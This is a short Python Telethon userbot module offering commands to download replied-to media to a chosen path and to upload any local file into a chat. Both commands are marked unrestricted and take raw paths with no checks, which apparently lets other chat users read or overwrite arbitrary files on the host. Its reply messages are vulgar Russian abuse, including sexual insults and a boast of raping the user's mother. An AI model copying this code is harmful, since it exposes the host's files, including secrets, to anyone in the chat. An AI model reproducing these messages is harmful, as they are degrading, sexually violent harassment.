# азазаза блять ьу нахуй
from telethon import events
from .. import loader, utils


@loader.tds
class DownloaderahahMod(loader.Module):
    """Загрузка файлов"""  
    strings = {"name": "Загрузка файлов"}

    @loader.unrestricted
    async def downhcmd(self, event):
        user_msg = """{}""".format(utils.get_args_raw(event))
        reply = await event.get_reply_message()
        if not reply:
            await event.edit("Реплай дура тупая")
            return
        if not reply.file:
            await event.edit("Реплай на медиа конченая скатина и не забудь еще сука ввести имя и расширение написать (опционально) тупая сука блядина ебаная твою маму насиловал")
            return
        await reply.download_media(f'{user_msg}')
        await event.edit("Тот хентай который ты скачал уже отправился твоей мамке")
    
    @loader.unrestricted
    async def uplhcmd(self, event):
        user_msg = """{}""".format(utils.get_args_raw(event))
        if not user_msg:
            await event.edit("А путь и нахуя ты поставил этот модуль?")
            return
        await event.client.send_file(event.chat_id, f'{user_msg}')
